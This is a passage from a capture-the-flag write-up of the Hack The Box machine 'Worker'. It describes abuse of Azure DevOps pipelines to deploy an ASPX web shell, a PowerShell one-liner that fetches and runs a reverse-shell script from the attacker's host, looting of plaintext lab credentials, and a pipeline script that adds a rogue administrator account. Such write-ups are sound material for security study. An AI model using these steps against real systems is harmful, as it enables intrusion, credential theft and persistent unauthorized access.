-<p>It seems user <code>nathen</code> is the only member of the SmartHotel360 Team.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175233456.png" alt="image-20210503175233456"  /></div>
-</p>
-<p>And the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175249455.png" alt="image-20210503175249455"  /></div>
-</p>
-<p>The Contributors group and Projects Valid Users group permissions are defined <a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">here</a>, and user <code>nathen</code> inherits those two groups' permission.</p>
-<p><div class="img-container"><img src="imgs/image-20210503230648404.png" alt="image-20210503230648404"  /></div>
-</p>
-<p>From there, I try to lookup into the project&rsquo;s repository.</p>
-<p>I find a bunch of website repositories on the Repos menu. These repositories are previously listed on <code>http://dimension.worker.htb/#work</code> page. User <code>nathen</code> is the author of these repositories.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175346216.png" alt="image-20210503175346216"  /></div>
-</p>
-<p>On the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.</p>
-<blockquote>
-<p>My video recommendation about CICD: <a href="https://www.youtube.com/watch?v=scEDHsr3APg">https://www.youtube.com/watch?v=scEDHsr3APg</a></p>
-</blockquote>
-<p><div class="img-container"><img src="imgs/image-20210503175356998.png" alt="image-20210503175356998"  /></div>
-</p>
-<p>User <code>nathen</code> is allowed to queue a builds.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175409857.png" alt="image-20210503175409857"  /></div>
-</p>
-<p>With all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-iis-appool">Shell as IIS appool</h3>
-<h4 id="webshell-upload">Webshell Upload</h4>
-<p>On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.</p>
-<p>So, I&rsquo;ll upload my web shell which is <code>cmdasp.aspx</code> (because the web server is IIS) on a new branch. I’ll be using the alpha repository.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175435088.png" alt="image-20210503175435088"  /></div>
-</p>
-<p>I&rsquo;ll pick any available work items.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175452577.png" alt="image-20210503175452577"  /></div>
-</p>
-<p>I can just drag and drop the web shell, and commit it afterwards.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175506892.png" alt="image-20210503175506892"  /></div>
-</p>
-<p>From here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.</p>
-<p>If I choose a pull request, it needs to be reviewed first and the reviewer is the user <code>nathen</code> itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175518917.png" alt="image-20210503175518917"  /></div>
-</p>
-<p>The other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).</p>
-<p><div class="img-container"><img src="imgs/image-20210503175531792.png" alt="image-20210503175531792"  /></div>
-</p>
-<p>After the build finished, I can see my web shell is available at <code>alpha.worker.htb/cmdasp.aspx</code>.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175541314.png" alt="image-20210503175541314"  /></div>
-</p>
-<p>To gain an interactive shell, I&rsquo;ll setup a <code>netcat</code> listener on my Kali, then I&rsquo;ll upload a <a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">PowerShell reverse shell</a> called <code>itsf.ps1</code> and execute it via the web shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\temp\itsf.ps1;C:\temp\itsf.ps1&#34;</span>
-</code></pre></div><p>I have a shell now on my listener.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175604917.png" alt="image-20210503175604917"  /></div>
-</p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-robisl">Shell as robisl</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>Enumerating the user groups and privileges using the <code>whoami /all</code> command reveals that IIS appool has <code>SeImpersonatePrivilege</code> which according to <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">BookHackTrick</a>, it can be abused using RogueWinRM.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175615273.png" alt="image-20210503175615273"  /></div>
-</p>
-<p>Unfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!</p>
-<p>Enumerating the Users folder finds two users, <code>robisl</code> and <code>restorer</code> (as the name implies, it restore the box configuration, I&rsquo;ll ignore this).</p>
-<p><div class="img-container"><img src="imgs/image-20210503175630874.png" alt="image-20210503175630874"  /></div>
-</p>
-<p>By using the <code>net</code> command, it shows that <code>robisl</code> can login remotely.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers&gt; net user robisl
-User name                    robisl
-Full Name                    Robin Islip
-Comment                      
-User’s comment               
-Country/region code          <span class="m">000</span> <span class="o">(</span>System Default<span class="o">)</span>
-Account active               Yes
-Account expires              Never
-
-Password last <span class="nb">set</span>            2020-04-05 21:27:26
-Password expires             Never
-Password changeable          2020-04-05 21:27:26
-Password required            No
-User may change password     No
-
-Workstations allowed         All
-Logon script                 
-User profile                 
-Home directory               
-Last logon                   2020-08-18 18:28:36
-
-Logon hours allowed          All
-
-Local Group Memberships      *Production           *Remote 
-Global Group memberships     *None                 
-The <span class="nb">command</span> completed successfully.
-</code></pre></div><p>With <code>net</code> command, I also find there is another drive mounted as <code>W:\</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\u</span>sers<span class="se">\&gt;</span>net share
-
-Share name   Resource                        Remark
-
--------------------------------------------------------------------------------
-C$           C:<span class="se">\ </span>                            Default share
-IPC$                                         Remote IPC
-W$           W:<span class="se">\ </span>                            Default share
-ADMIN$       C:<span class="se">\W</span>indows                      Remote Admin
-The <span class="nb">command</span> completed successfully.
-</code></pre></div><p>There are 4 folders in the <code>W:\</code> drive, the one that interesting is the svnrepos folder.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS W:<span class="se">\&gt;</span> dir
-
-
-    Directory: W:<span class="se">\
-</span><span class="se"></span>
-
-Mode                LastWriteTime         Length Name                                                             
-----                -------------         ------ ----                                                             
-d-----       2020-06-16     18:59                agents                                                          
-d-----       2020-03-28     15:57                AzureDevOpsData                                                
-d-----       2020-04-03     11:31                sites                                                          
-d-----       2020-06-20     16:04                svnrepos
-</code></pre></div><p>I can enumerate all folder and sub folder on the <code>W:</code> drive recursively using the <code>dir</code> command. Because I&rsquo;m on PowerShell, I have to specify <code>cmd /c</code> .</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS W:<span class="se">\&gt;</span> cmd.exe /c <span class="s2">&#34;dir /s /b svnrepos&#34;</span>
-</code></pre></div><p>Well PowerShell can do that too.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS W:<span class="se">\&gt;</span> Get-ChildItem -Path W:<span class="se">\s</span>vnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force
-</code></pre></div><p>In the output, there is a <code>passwd</code> file that immediately draws my attention.</p>
-<p><div class="img-container"><img src="imgs/image-20210504232344047.png" alt="image-20210504232344047"  /></div>
-</p>
-<p>The <code>passwd</code> file contains a bunch of credentials, one of which is a password for <code>robisl</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS W:<span class="se">\s</span>vnrepos<span class="se">\&gt;</span> gc .<span class="se">\w</span>ww<span class="se">\c</span>onf<span class="se">\p</span>asswd
-<span class="c1">### This file is an example password file for svnserve.</span>
-<span class="c1">### Its format is similar to that of svnserve.conf. As shown in the</span>
-<span class="c1">### example below it contains one section labelled [users].</span>
-<span class="c1">### The name and password for each user follow, one account per line.</span>
-
-<span class="o">[</span>users<span class="o">]</span>
-<span class="nv">nathen</span> <span class="o">=</span> wendel98
-<span class="nv">nichin</span> <span class="o">=</span> fqerfqerf
-<span class="nv">nichin</span> <span class="o">=</span> asifhiefh
-<span class="nv">noahip</span> <span class="o">=</span> player
-<span class="nv">nuahip</span> <span class="o">=</span> wkjdnw
-<span class="nv">oakhol</span> <span class="o">=</span> bxwdjhcue
-<span class="nv">owehol</span> <span class="o">=</span> supersecret
-<span class="nv">paihol</span> <span class="o">=</span> painfulcode
-<span class="nv">parhol</span> <span class="o">=</span> gitcommit
-<span class="nv">pathop</span> <span class="o">=</span> iliketomoveit
-<span class="nv">pauhor</span> <span class="o">=</span> nowayjose
-<span class="nv">payhos</span> <span class="o">=</span> icanjive
-<span class="nv">perhou</span> <span class="o">=</span> elvisisalive
-<span class="nv">peyhou</span> <span class="o">=</span> ineedvacation
-<span class="nv">phihou</span> <span class="o">=</span> pokemon
-<span class="nv">quehub</span> <span class="o">=</span> pickme
-<span class="nv">quihud</span> <span class="o">=</span> kindasecure
-<span class="nv">rachul</span> <span class="o">=</span> guesswho
-<span class="nv">raehun</span> <span class="o">=</span> idontknow
-<span class="nv">ramhun</span> <span class="o">=</span> thisis
-<span class="nv">ranhut</span> <span class="o">=</span> getting
-<span class="nv">rebhyd</span> <span class="o">=</span> rediculous
-<span class="nv">reeinc</span> <span class="o">=</span> iagree
-<span class="nv">reeing</span> <span class="o">=</span> tosomepoint
-<span class="nv">reiing</span> <span class="o">=</span> isthisenough
-<span class="nv">renipr</span> <span class="o">=</span> dummy
-<span class="nv">rhiire</span> <span class="o">=</span> users
-<span class="nv">riairv</span> <span class="o">=</span> canyou
-<span class="nv">ricisa</span> <span class="o">=</span> seewhich
-<span class="nv">robish</span> <span class="o">=</span> onesare
-<span class="nv">robisl</span> <span class="o">=</span> wolves11
-<span class="nv">robive</span> <span class="o">=</span> andwhich
-<span class="nv">ronkay</span> <span class="o">=</span> onesare
-<span class="nv">rubkei</span> <span class="o">=</span> the
-<span class="nv">rupkel</span> <span class="o">=</span> sheeps
-<span class="nv">ryakel</span> <span class="o">=</span> imtired
-<span class="nv">sabken</span> <span class="o">=</span> drjones
-<span class="nv">samken</span> <span class="o">=</span> aqua
-<span class="nv">sapket</span> <span class="o">=</span> hamburger
-<span class="nv">sarkil</span> <span class="o">=</span> friday
-</code></pre></div><h4 id="remote-access---robisl">Remote Access - robisl</h4>
-<p>I can login remotely using <code>robisl</code> credentials with <code>evil-winrm</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «worker» «10.10.14.19»
-$ evil-winrm -i 10.10.10.203 -u robisl -p wolves11
-
-Evil-WinRM shell v2.3
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>ocuments&gt; whoami
-worker<span class="se">\r</span>obisl
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../Desktop
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; dir
-
-
-    Directory: C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---        1/29/2020   3:37 PM             <span class="m">34</span> user.txt
-</code></pre></div><h3 id="shell-as-administrator">Shell as administrator</h3>
-<h4 id="azure-devops---partsunlimited">Azure DevOps - PartsUnlimited</h4>
-<p>After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a <code>robisl</code> account.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175744995.png" alt="image-20210503175744995"  /></div>
-</p>
-<p>Long short story, <code>robisl </code> is member of Build Administrator.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175756504.png" alt="image-20210503175756504"  /></div>
-</p>
-<p>The Build Administrators defined as follows [<a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">source</a>].</p>
-<p><div class="img-container"><img src="imgs/image-20210504010111041.png" alt=""  /></div>
-</p>
-<h4 id="exploit-azure-pipelines---read-the-root-flag">Exploit Azure Pipelines - Read the Root Flag</h4>
-<p>So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175809136.png" alt="image-20210503175809136"  /></div>
-</p>
-<p>If I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user <code>robisl</code> also has access to it.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175820811.png" alt="image-20210503175820811"  /></div>
-</p>
-<p>So, let’s execute the plan!</p>
-<p>First, I’ll create a pipeline (Pipelines -&gt; Builds -&gt;  New Pipeline).</p>
-<p><div class="img-container"><img src="imgs/image-20210503175837201.png" alt="image-20210503175837201"  /></div>
-</p>
-<p>In the next section, I’ll choose Azure Repos Git.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175848517.png" alt="image-20210503175848517"  /></div>
-</p>
-<p>On the next one, I’ll select &ldquo;PartsUnlimited&rdquo; as the repository, because that is the repo where <code>robisl</code> is working on.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175906165.png" alt="image-20210503175906165"  /></div>
-</p>
-<p>In the Configure section, scroll down and select the starter pipeline (I forgot the name, but don&rsquo;t choose the existing one). After that, I’ll modify the pool and the script in the &ldquo;Review&rdquo; section to steal the flag.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175920007.png" alt="image-20210503175920007"  /></div>
-</p>
-<p>The master branch will be the <code>trigger</code> to run the CI\CD (If I push a changes to the &ldquo;PartsUnlimited&rdquo; repository). Since I have access to the &ldquo;Setup&rdquo; pool, I&rsquo;ll use it as the <code>pool</code>. Lastly, on the <code>steps</code> you can add a task/script you want to run/do. In my case, I want to read the root flag.</p>
-<p>I’ll save it and run it on a new branch.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175931307.png" alt="image-20210503175931307"  /></div>
-</p>
-<p>I’ll just wait for the output log.</p>
-<p><div class="img-container"><img src="imgs/image-20210503175944023.png" alt="image-20210503175944023"  /></div>
-</p>
-<p>Once it completed, I can see the root flag inside the &ldquo;Steal the flag&rdquo; output</p>
-<p><div class="img-container"><img src="imgs/image-20210503175957351.png" alt="image-20210503175957351"  /></div>
-</p>
-<h4 id="create-user-with-administrator-privileges">Create User with Administrator Privileges</h4>
-<p>I can also create a privileged user using multi-line script.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml">- <span class="nt">script</span><span class="p">:</span><span class="w"> </span><span class="l">| </span><span class="w">
-</span><span class="w"></span><span class="l">net user iamf YourComplexPassword /add /domain</span><span class="w">
-</span><span class="w"></span><span class="l">net localgroup Administrators iamf /add </span><span class="w">
-</span><span class="w"></span><span class="l">net localgroup &#34;Remote Management Users&#34; iamf /add </span><span class="w">
-</span><span class="w"></span><span class="nt">displayName</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;Set IamF to Admin&#34;</span><span class="w">
-</span></code></pre></div><p>I can push it again and wait for it to complete.</p>
-<p><div class="img-container"><img src="imgs/image-20210503180039057.png" alt="image-20210503180039057"  /></div>
-</p>
-<p>Now I can login with the newly created user.</p>
-<p><div class="img-container"><img src="imgs/image-20210503180028754.png" alt="image-20210503180028754"  /></div>
-</p>
-<hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops">https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops</a></li>
-<li><a href="https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/">https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/</a></li>
-<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers">https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers</a></li>
 </ul>
 ]]></content:encoded>
     </item>
